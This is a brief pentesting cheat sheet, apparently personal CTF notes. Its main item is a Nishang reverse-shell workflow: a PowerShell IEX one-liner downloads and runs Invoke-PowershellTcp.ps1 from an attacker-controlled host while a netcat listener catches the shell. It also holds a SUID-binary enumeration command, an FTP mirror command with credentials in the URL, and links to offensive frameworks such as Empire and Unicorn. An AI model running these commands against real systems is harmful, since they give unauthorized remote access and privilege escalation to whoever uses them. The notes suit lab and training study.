# Tools & Techniques


## Nishang
To get a sheel from an entry point where cmd is working or the entry point is a cmd

cp /opt/nishang/Shells/Invoke-PowershellTcp.ps1 nishang.ps1
gedit nishang.ps1
Invoke-PowershellTcp -Reverse -IpAdress *.*.*.* -Port *
python -m SimpleHTTPServer
nc -lvnp *

In cmd:
powershell "IEX(New-Object Net.WebClient).downloadString('http://*.*.*.*:*/nishang.ps1')"


## Linux

# to list suid binary file:
find / -perm -u=s -type f 2>/dev/null -exec ls -l {} \;

## Windows

# to convert in base64 with UTF-16LE encoding
echo -n "Hello World" | iconv --to-code UTF-16LE | base64 -w 0

## Tools

# Shell and Crack
Unicorn.py :  https://github.com/trustedsec/unicorn  
Empire.py  :  https://github.com/EmpireProject/Empire
JAWS       :  https://github.com/411Hall/JAWS   (Windows Enumeration Tools)
zip2john   :  https://github.com/piyushcse29/john-the-ripper/blob/master/src/zip2john.c (To crack zipped password)

# Steganography tools
zsteg,steghide,binwalk.strings,file,foremost

# Other tools
readpst,mdb-shell,mdb-sql
## Techniques

To download all files from ftp server:
wget -m --no-passive ftp://username:password@x.x.x.x
